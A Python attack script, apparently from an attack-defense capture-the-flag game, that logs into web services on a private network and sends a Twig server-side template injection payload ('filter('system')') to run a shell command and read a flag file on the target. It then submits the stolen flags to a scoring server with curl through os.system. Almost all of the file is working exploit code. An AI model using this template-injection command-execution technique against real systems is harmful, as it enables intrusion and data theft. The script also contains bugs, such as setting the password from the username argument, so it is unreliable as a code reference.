import requests
import re
import os
import socket
import argparse
import time

parser = argparse.ArgumentParser()
parser.add_argument("--username", help="Username")
parser.add_argument("--password", help="Password")
parser.add_argument("--port", help="port")
args = parser.parse_args()
username = args.username
password = args.username
port = args.port
f = open("payload.txt", "r")


def recvall(s):
    total_data = []
    response = s.recv(4096)
    while (len(response) > 0):
        total_data.append(response.decode())
        response = s.recv(4096)
    response = ''.join(total_data)
    return response


f = open("payload.txt", "r")
while (True):
    port = f.readline().strip()
    if (port == ""):
        break
    payload1 = f.readline().strip()
    payload2 = f.readline().strip()
    s = requests.Session()

    data = {"username": payload1, "password": payload1}
    try:
        r = s.post("http://10.254.0.254:" + port + "/index.php?page=login",
                data=data)
        cookies = re.findall("PHPSESSID=\w+", str(s.cookies))
        cookies = cookies[0]
    except:
        print("Error")
        continue
    
    # print(cookies)
    host = "10.254.0.254"
    Port = int(port)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, Port))
        body = "name={{['cat ../../../flag']|filter('system')}}&preview=1"
        request = "POST /index.php?page=user HTTP/1.1\r\n" + "Host: 10.254.0.254:" + port + "\r\n" + "Content-Length: " + str(
            len(body)
        ) + "\r\n" + "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" + "Cookie: " + cookies + "\r\n\r\n" + body
        client.send(request.encode())
        # print(request)
        flag1 = recvall(client)
    except:
        print("Error")
    print(flag1)
    try:
        flag1 = flag1.split("{")[1][1:-10]
        print(flag1)
        arr_flag = flag1.split("\n")
        for flag in arr_flag[-2:]:
            if (flag == "error"):
                continue
            print(flag)
            payload = "curl -i -s -k -X 'PUT' -H 'Host: 10.254.0.253:8080' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: /' -H 'Connection: close' -H 'X-Team-Token: d3c13df193ac6f28' -H 'Content-Length: 36' -H 'Content-Type: application/json' --data-binary '[\"" + flag + "\"]' 'http://10.254.0.253:8080/flags'"
            os.system(payload)
            time.sleep(2)
    except:
        print("Error")
